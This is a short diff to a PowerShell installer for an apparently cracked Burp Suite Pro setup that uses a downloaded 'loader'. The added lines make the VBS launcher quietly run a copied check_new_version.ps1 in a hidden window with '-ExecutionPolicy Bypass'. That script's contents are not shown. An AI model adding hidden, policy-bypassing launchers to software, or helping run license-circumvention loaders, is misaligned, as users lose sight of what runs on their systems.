@@ -76,8 +76,20 @@ if (Test-Path Burp-Suite-Pro.vbs) {
 }
 Write-Output "Set WshShell = CreateObject(`"WScript.Shell`")" > Burp-Suite-Pro.vbs
 add-content Burp-Suite-Pro.vbs "WshShell.Run chr(34) & `"$pwd\Burp.bat`" & Chr(34), 0"
-add-content Burp-Suite-Pro.vbs "Set WshShell = Nothing"
+Add-Content Burp-Suite-Pro.vbs ""
+Add-Content Burp-Suite-Pro.vbs "WScript.Sleep 2000"
+Add-Content Burp-Suite-Pro.vbs "WshShell.Run `"powershell.exe -ExecutionPolicy Bypass -File `"`"$pwd\check_new_version.ps1`"`"`", 0"
+Add-Content Burp-Suite-Pro.vbs "Set WshShell = Nothing"
 Write-Output "`nBurp-Suite-Pro.vbs file is created."
+
+
+# Definir ruta del script origen (en la misma carpeta que este script)
+$checkNewVersionScript = Join-Path $PSScriptRoot "check_new_version.ps1"
+# Ruta completa destino
+$destcheckNewVersionScript = Join-Path $workDir "check_new_version.ps1"
+# Copiar archivo
+Copy-Item -Path $checkNewVersionScript -Destination $destcheckNewVersionScript -Force
+Write-Output "check_new_version.ps1 was copied to $workDir"
 
 
 # Download loader if it not exists
